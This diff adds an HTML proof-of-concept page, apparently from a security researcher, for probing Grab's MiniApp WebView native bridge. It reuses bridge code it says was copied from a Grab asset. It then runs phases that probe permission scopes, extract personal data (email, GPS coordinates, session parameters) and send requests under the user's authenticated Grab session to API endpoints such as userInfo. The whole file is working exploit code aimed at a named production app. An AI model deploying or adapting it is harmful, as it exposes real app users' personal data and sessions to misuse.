@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SuperApp Bridge Test</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,system-ui,sans-serif;background:#0a0a0a;color:#e0e0e0;padding:12px;font-size:13px}
+h1{font-size:16px;color:#00b14f;margin-bottom:8px}
+.env{background:#111;border:1px solid #222;border-radius:8px;padding:10px;margin-bottom:10px;font-family:monospace;font-size:11px;word-break:break-all}
+.env .tag{display:inline-block;padding:2px 6px;border-radius:4px;font-size:10px;margin:2px}
+.tag.android{background:#1b5e20;color:#a5d6a7}
+.tag.ios{background:#0d47a1;color:#90caf9}
+.tag.miss{background:#333;color:#777}
+.probe{background:#111;border:1px solid #222;border-radius:8px;margin-bottom:6px;overflow:hidden}
+.probe .hdr{display:flex;justify-content:space-between;align-items:center;padding:8px 10px;cursor:pointer}
+.probe .hdr:active{background:#1a1a1a}
+.probe .name{font-weight:600;font-size:12px}
+.probe .badge{font-size:10px;padding:2px 8px;border-radius:10px;font-weight:700;min-width:20px;text-align:center}
+.badge.wait{background:#333;color:#888}
+.badge.ok{background:#1b5e20;color:#a5d6a7}
+.badge.deny{background:#b71c1c;color:#ef9a9a}
+.badge.err{background:#4a148c;color:#ce93d8}
+.badge.skip{background:#263238;color:#78909c}
+.probe .body{padding:0 10px 8px;font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-all;color:#aaa;display:none}
+.probe.open .body{display:block}
+.actions{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+.btn{padding:8px 14px;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;color:#fff}
+.btn.green{background:#00b14f}
+.btn.blue{background:#1565c0}
+.btn.orange{background:#e65100}
+.btn.red{background:#b71c1c}
+.btn.gray{background:#333;color:#aaa}
+.btn:active{opacity:.7}
+.log{background:#050505;border:1px solid #1a1a1a;border-radius:6px;padding:8px;margin-top:8px;max-height:200px;overflow-y:auto;font-family:monospace;font-size:10px;color:#666}
+.log .l{margin-bottom:2px}
+.log .l.ok{color:#66bb6a}
+.log .l.err{color:#ef5350}
+.log .l.info{color:#42a5f5}
+</style>
+</head>
+<body>
+
+<h1>SuperApp Bridge Test</h1>
+<div id="env" class="env">Detecting environment...</div>
+
+<div class="actions">
+  <button class="btn green" onclick="runAll()">Run All</button>
+  <button class="btn blue" onclick="runScopes()">Probe Scopes</button>
+  <button class="btn orange" onclick="runPII()">Fetch PII</button>
+  <button class="btn red" onclick="runNetwork()">Network Send</button>
+  <button class="btn gray" onclick="clearAll()">Clear</button>
+</div>
+
+<div id="probes"></div>
+<div id="logbox" class="log"></div>
+
+<script>
+// ════════════════════════════════════════════════════════════════
+// Bridge runtime — extracted verbatim from grabtravel.grab.com
+// /assets/index.esm-D3z_6957.js  (© Grab Taxi Holdings PTE LTD)
+// ════════════════════════════════════════════════════════════════
+
+var SDK=(function(){
+  var X={};
+
+  function createSub(fn){
+    var d=false;
+    return{isUnsubscribed:function(){return d},unsubscribe:function(){if(!d){fn();d=true}}}
+  }
+
+  function stream(sub){
+    return{
+      subscribe:sub,
+      then:function(ok,fail){
+        return new Promise(function(res,rej){
+          try{
+            var h=null,done=false;
+            h=sub({next:function(v){res(ok?ok(v):v);if(h)h.unsubscribe();done=true}});
+            if(done&&h)h.unsubscribe()
+          }catch(e){fail==null?rej(e):res(fail(e))}
+        })
+      }
+    }
+  }
+
+  function cbName(ctx,mod,fn){
+    var id=0;
+    return function(){
+      var n="";
+      while((n=mod+"_"+fn+"Callback"+(id!==null?"_"+id:""))in ctx)id++;
+      id++;return n
+    }
+  }
+
+  function wrapCall(ctx,opts){
+    return stream(function(obs){
+      var s,name=opts.cbFunc();
+      ctx[name]=function(r){
+        if(r.result&&r.result.event==="STREAM_TERMINATED"){s.unsubscribe();return}
+        var res=r.result===null?undefined:r.result;
+        var err=r.error===null?undefined:r.error;
+        var sc=r.status_code===null?undefined:r.status_code;
+        if(obs&&obs.next)obs.next({result:res,error:err,status_code:sc})
+      };
+      opts.wrap(name);
+      s=createSub(function(){ctx[name]=undefined;if(obs&&obs.complete)obs.complete()});
+      return s
+    })
+  }
+
+  X.env=function(w,m){
+    if(w[m])return"android";
+    if(w.webkit&&w.webkit.messageHandlers&&w.webkit.messageHandlers[m])return"ios";
+    return undefined
+  };
+
+  X.wrap=function(w,m){
+    w["Wrapped"+m]=(function(ctx,name,call){
+      return{invoke:function(method,params){
+        return wrapCall(ctx,{
+          cbFunc:cbName(ctx,name,method),
+          wrap:function(cb){call({callback:cb,method:method,module:name,parameters:params||{}})}
+        })
+      }}
+    })(w,m,function(msg){
+      if(w[m]&&w[m][msg.method]instanceof Function)
+        w[m][msg.method](JSON.stringify(msg));
+      else if(w.webkit&&w.webkit.messageHandlers&&w.webkit.messageHandlers[m])
+        w.webkit.messageHandlers[m].postMessage(msg);
+      else throw new Error("No bridge: "+m+"."+msg.method)
+    })
+  };
+
+  return X
+})();
+
+
+// ════════════════════════════════════════════════════════════════
+// Module list — all 17 from SDK export block
+// ════════════════════════════════════════════════════════════════
+
+var MODULES=[
+  "CameraModule","CheckoutModule","ContainerModule","DeviceModule",
+  "FileModule","IdentityModule","LocaleModule","LocationModule",
+  "MediaModule","NetworkModule","PlatformModule","ProfileModule",
+  "ScopeModule","SplashScreenModule","StorageModule",
+  "SystemWebViewKitModule","UserAttributesModule"
+];
+
+
+// ════════════════════════════════════════════════════════════════
+// UI helpers
+// ════════════════════════════════════════════════════════════════
+
+var logEl=document.getElementById("logbox");
+var probesEl=document.getElementById("probes");
+
+function log(cls,msg){
+  var d=document.createElement("div");
+  d.className="l "+cls;
+  d.textContent="["+new Date().toLocaleTimeString()+"] "+msg;
+  logEl.appendChild(d);
+  logEl.scrollTop=logEl.scrollHeight
+}
+
+function makeProbe(id,label){
+  var el=document.createElement("div");
+  el.className="probe";el.id="p-"+id;
+  el.innerHTML='<div class="hdr"><span class="name">'+label+'</span><span class="badge wait" id="b-'+id+'">...</span></div><div class="body" id="d-'+id+'"></div>';
+  el.querySelector(".hdr").onclick=function(){el.classList.toggle("open")};
+  probesEl.appendChild(el);
+  return{
+    status:function(cls,txt){var b=document.getElementById("b-"+id);b.className="badge "+cls;b.textContent=txt},
+    data:function(obj){var d=document.getElementById("d-"+id);d.textContent=typeof obj==="string"?obj:JSON.stringify(obj,null,2);el.classList.add("open")}
+  }
+}
+
+function clearAll(){
+  probesEl.innerHTML="";logEl.innerHTML="";
+  log("info","Cleared")
+}
+
+
+// ════════════════════════════════════════════════════════════════
+// Invoke helper
+// ════════════════════════════════════════════════════════════════
+
+async function invoke(mod,method,params){
+  var w=window["Wrapped"+mod];
+  if(!w)throw new Error(mod+" not wrapped");
+  return w.invoke(method,params||{})
+}
+
+
+// ════════════════════════════════════════════════════════════════
+// Phase 1: Detect & wrap
+// ════════════════════════════════════════════════════════════════
+
+function detect(){
+  var envEl=document.getElementById("env");
+  var html="";
+  var found=0;
+
+  for(var i=0;i<MODULES.length;i++){
+    var m=MODULES[i];
+    var e=SDK.env(window,m);
+    if(e){
+      found++;
+      if(!window["Wrapped"+m])SDK.wrap(window,m);
+      html+='<span class="tag '+e+'">'+m.replace("Module","")+" ("+e+")</span> "
+    }else{
+      html+='<span class="tag miss">'+m.replace("Module","")+"</span> "
+    }
+  }
+
+  var header=found>0
+    ?"<b style='color:#00b14f'>"+found+"/"+MODULES.length+" bridges detected</b><br>"
+    :"<b style='color:#ef5350'>No native bridges — run inside Grab MiniApp container</b><br>";
+
+  envEl.innerHTML=header+html;
+  log(found>0?"ok":"err","Detected "+found+" bridges");
+  return found
+}
+
+detect();
+
+
+// ════════════════════════════════════════════════════════════════
+// Phase 2: Scope probes
+// ScopeModule.hasAccessTo({module, method})
+// Evidence: index.esm class `is` → method:"hasAccessTo"
+// APK: ExternalScopeKitImpl.mo63116a(module, method)
+//      → scopeRepository.mo63137b(clientId, module).contains(method)
+// ════════════════════════════════════════════════════════════════
+
+var SCOPE_PROBES=[
+  {module:"identity",  method:"authorize",        label:"IdentityModule.authorize"},
+  {module:"checkout",  method:"triggerCheckout",   label:"CheckoutModule.triggerCheckout"},
+  {module:"profile",   method:"fetchEmail",        label:"ProfileModule.fetchEmail"},
+  {module:"profile",   method:"verifyEmail",       label:"ProfileModule.verifyEmail"},
+  {module:"network",   method:"send",              label:"NetworkModule.send"},
+  {module:"location",  method:"getCoordinate",     label:"LocationModule.getCoordinate"},
+  {module:"location",  method:"getCountryCode",    label:"LocationModule.getCountryCode"},
+  {module:"storage",   method:"setString",         label:"StorageModule.setString"},
+  {module:"storage",   method:"getString",         label:"StorageModule.getString"},
+  {module:"container", method:"getSessionParams",  label:"ContainerModule.getSessionParams"},
+  {module:"container", method:"sendAnalyticsEvent",label:"ContainerModule.sendAnalyticsEvent"},
+  {module:"camera",    method:"scanQRCode",        label:"CameraModule.scanQRCode"},
+  {module:"device",    method:"isEsimSupported",   label:"DeviceModule.isEsimSupported"},
+  {module:"file",      method:"downloadFile",      label:"FileModule.downloadFile"},
+];
+
+async function runScopes(){
+  if(!window.WrappedScopeModule){log("err","ScopeModule not available");return}
+
+  // reloadScopes first (grab-payment-C4PWhscV.js: new E().reloadScopes())
+  var rl=makeProbe("reload","ScopeModule.reloadScopes");
+  try{
+    var r=await invoke("ScopeModule","reloadScopes");
+    rl.status(r.status_code>=200&&r.status_code<300?"ok":"deny",r.status_code);
+    rl.data(r);
+    log("ok","reloadScopes → "+r.status_code)
+  }catch(e){
+    rl.status("err","ERR");rl.data(e.message);
+    log("err","reloadScopes → "+e.message)
+  }
+
+  // hasAccessTo for each probe
+  for(var i=0;i<SCOPE_PROBES.length;i++){
+    var sp=SCOPE_PROBES[i];
+    var p=makeProbe("scope-"+i,sp.label);
+    try{
+      var resp=await invoke("ScopeModule","hasAccessTo",{module:sp.module,method:sp.method});
+      if(resp.status_code===200&&resp.result===true){
+        p.status("ok","YES");log("ok",sp.label+" → GRANTED")
+      }else if(resp.status_code===200&&resp.result===false){
+        p.status("deny","NO");log("err",sp.label+" → DENIED")
+      }else if(resp.status_code===204){
+        p.status("skip","N/A");log("info",sp.label+" → 204 no scope data")
+      }else{
+        p.status("deny",resp.status_code);log("err",sp.label+" → "+resp.status_code)
+      }
+      p.data(resp)
+    }catch(e){
+      p.status("err","ERR");p.data(e.message);
+      log("err",sp.label+" → "+e.message)
+    }
+  }
+}
+
+
+// ════════════════════════════════════════════════════════════════
+// Phase 3: PII extraction
+// ProfileModule.fetchEmail — index.esm class K → method:"fetchEmail"
+// LocationModule.getCoordinate — index.esm class ss → method:"getCoordinate"
+// LocationModule.getCountryCode — index.esm class ss → method:"getCountryCode"
+// ContainerModule.getSessionParams — grab-sso-k89VGuRZ.js → S().getSessionParams()
+// ════════════════════════════════════════════════════════════════
+
+async function runPII(){
+  // fetchEmail
+  if(window.WrappedProfileModule){
+    var pe=makeProbe("email","ProfileModule.fetchEmail");
+    try{
+      var r=await invoke("ProfileModule","fetchEmail");
+      if(r.status_code===200){
+        pe.status("ok",r.status_code);
+        log("ok","fetchEmail → "+JSON.stringify(r.result))
+      }else{
+        pe.status("deny",r.status_code);
+        log("err","fetchEmail → "+r.status_code+" "+r.error)
+      }
+      pe.data(r)
+    }catch(e){pe.status("err","ERR");pe.data(e.message);log("err","fetchEmail → "+e.message)}
+  }
+
+  // getCoordinate
+  if(window.WrappedLocationModule){
+    var lc=makeProbe("coord","LocationModule.getCoordinate");
+    try{
+      var r=await invoke("LocationModule","getCoordinate");
+      if(r.status_code===200){
+        lc.status("ok",r.status_code);
+        log("ok","getCoordinate → "+JSON.stringify(r.result))
+      }else{
+        lc.status("deny",r.status_code);
+        log("err","getCoordinate → "+r.status_code)
+      }
+      lc.data(r)
+    }catch(e){lc.status("err","ERR");lc.data(e.message);log("err","getCoordinate → "+e.message)}
+
+    // getCountryCode
+    var cc=makeProbe("country","LocationModule.getCountryCode");
+    try{
+      var r=await invoke("LocationModule","getCountryCode");
+      if(r.status_code===200){
+        cc.status("ok",r.status_code);
+        log("ok","getCountryCode → "+JSON.stringify(r.result))
+      }else{
+        cc.status("deny",r.status_code);
+        log("err","getCountryCode → "+r.status_code)
+      }
+      cc.data(r)
+    }catch(e){cc.status("err","ERR");cc.data(e.message);log("err","getCountryCode → "+e.message)}
+  }
+
+  // getSessionParams
+  if(window.WrappedContainerModule){
+    var sp=makeProbe("session","ContainerModule.getSessionParams");
+    try{
+      var r=await invoke("ContainerModule","getSessionParams");
+      var parsed=r.result?JSON.parse(r.result):{};
+      sp.status("ok",r.status_code);
+      sp.data(parsed);
+      log("ok","getSessionParams → "+JSON.stringify(parsed))
+    }catch(e){sp.status("err","ERR");sp.data(e.message);log("err","getSessionParams → "+e.message)}
+  }
+}
+
+
+// ════════════════════════════════════════════════════════════════
+// Phase 4: Authenticated network request
+// NetworkModule.send — grab-sso-k89VGuRZ.js → new o().send(g)
+// The native layer attaches the user's Grab auth session automatically.
+// ════════════════════════════════════════════════════════════════
+
+async function runNetwork(){
+  if(!window.WrappedNetworkModule){log("err","NetworkModule not available");return}
+
+  // Test 1: SSO deeplink endpoint (grab-sso uses this exact call)
+  var n1=makeProbe("net-sso","NetworkModule → /horus/partners/nuitee/sso-deeplink");
+  try{
+    var r=await invoke("NetworkModule","send",{
+      endpoint:"https://api2.grab.com/horus/partners/nuitee/sso-deeplink",
+      method:"GET"
+    });
+    n1.status(r.status_code>=200&&r.status_code<300?"ok":"deny",r.status_code);
+    var body=r.result;
+    if(typeof body==="string"){try{body=JSON.parse(body)}catch(e){}}
+    n1.data({status_code:r.status_code,result:body,error:r.error});
+    log(r.status_code===200?"ok":"err","sso-deeplink → "+r.status_code)
+  }catch(e){n1.status("err","ERR");n1.data(e.message);log("err","sso-deeplink → "+e.message)}
+
+  // Test 2: GrabID user info (proves authenticated session)
+  var n2=makeProbe("net-userinfo","NetworkModule → /grabid/v1/oauth2/userInfo");
+  try{
+    var r=await invoke("NetworkModule","send",{
+      endpoint:"https://api.grab.com/grabid/v1/oauth2/userInfo",
+      method:"GET"
+    });
+    n2.status(r.status_code>=200&&r.status_code<300?"ok":"deny",r.status_code);
+    var body=r.result;
+    if(typeof body==="string"){try{body=JSON.parse(body)}catch(e){}}
+    n2.data({status_code:r.status_code,result:body,error:r.error});
+    log(r.status_code===200?"ok":"err","userInfo → "+r.status_code)
+  }catch(e){n2.status("err","ERR");n2.data(e.message);log("err","userInfo → "+e.message)}
+
+  // Test 3: GrabID token endpoint config (openid-configuration)
+  var n3=makeProbe("net-oidc","NetworkModule → /.well-known/openid-configuration");
+  try{
+    var r=await invoke("NetworkModule","send",{
+      endpoint:"https://partner-api.grab.com/grabid/v1/oauth2/.well-known/openid-configuration",
+      method:"GET"
+    });
+    n3.status(r.status_code>=200&&r.status_code<300?"ok":"deny",r.status_code);
+    var body=r.result;
+    if(typeof body==="string"){try{body=JSON.parse(body)}catch(e){}}
+    n3.data({status_code:r.status_code,result:body,error:r.error});
+    log(r.status_code===200?"ok":"err","openid-config → "+r.status_code)
+  }catch(e){n3.status("err","ERR");n3.data(e.message);log("err","openid-config → "+e.message)}
+}
+
+
+// ════════════════════════════════════════════════════════════════
+// Run All — sequential execution of every phase
+// ════════════════════════════════════════════════════════════════
+
+async function runAll(){
+  clearAll();
+  detect();
+  log("info","── Phase 2: Scope probes ──");
+  await runScopes();
+  log("info","── Phase 3: PII extraction ──");
+  await runPII();
+  log("info","── Phase 4: Authenticated network ──");
+  await runNetwork();
+  log("ok","══ ALL DONE ══")
+}
+</script>
+</body>
+</html>
